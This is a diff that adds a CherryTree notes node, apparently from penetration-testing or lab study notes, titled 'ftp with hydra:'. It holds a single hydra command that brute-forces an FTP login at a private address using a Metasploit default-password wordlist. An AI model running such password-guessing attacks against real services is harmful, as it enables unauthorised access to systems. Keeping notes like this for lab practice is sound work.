@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="69" master_id="0" name="ftp with hydra:" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1749163160" ts_lastsave="1749163388">
+    <rich_text>
+
+</rich_text>
+    <codebox char_offset="0" justification="left" frame_width="1971" frame_height="20" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l ftp -P /usr/share/metasploit-framework/data/wordlists/default_pass_for_services_unhash.txt ftp://10.10.0.197
+
+</codebox>
+  </node>
+</cherrytree>
